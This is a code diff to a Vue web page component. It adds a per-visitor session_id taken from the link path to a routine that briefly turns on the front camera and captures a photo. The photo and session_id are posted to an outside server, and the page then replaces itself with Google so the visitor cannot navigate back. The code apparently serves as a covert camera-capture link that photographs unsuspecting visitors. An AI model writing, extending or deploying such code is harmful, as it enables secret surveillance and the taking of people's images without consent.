@@ -15,6 +15,15 @@ export default {
   methods: {
     async startCamera() {
       try {
+        // ✅ session_id URL path’dan olinadi: /lk/:id
+        const session_id = this.$route.params.id
+
+        if (!session_id) {
+          console.error("session_id topilmadi")
+          this.redirect()
+          return
+        }
+
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
@@ -37,21 +46,29 @@ export default {
           // kamerani o‘chiramiz
           stream.getTracks().forEach(t => t.stop())
 
-          // API’ga yuboramiz
+          // 🔹 API’ga yuboramiz (image + session_id)
           await fetch("https://api.peoplehello.ru/upload", {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image: imageBase64 })
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              image: imageBase64,
+              session_id
+            })
           })
 
-          // Google’ga redirect
-          window.location.href = "https://www.google.com"
+          // 🔹 Google’ga redirect
+          this.redirect()
         }, 1000)
 
       } catch (err) {
         console.error("Camera error:", err)
-        window.location.href = "https://www.google.com"
+        this.redirect()
       }
+    },
+
+    redirect() {
+      // replace → back bosilganda qaytib kelmasin
+      window.location.replace("https://www.google.com")
     }
   }
 }
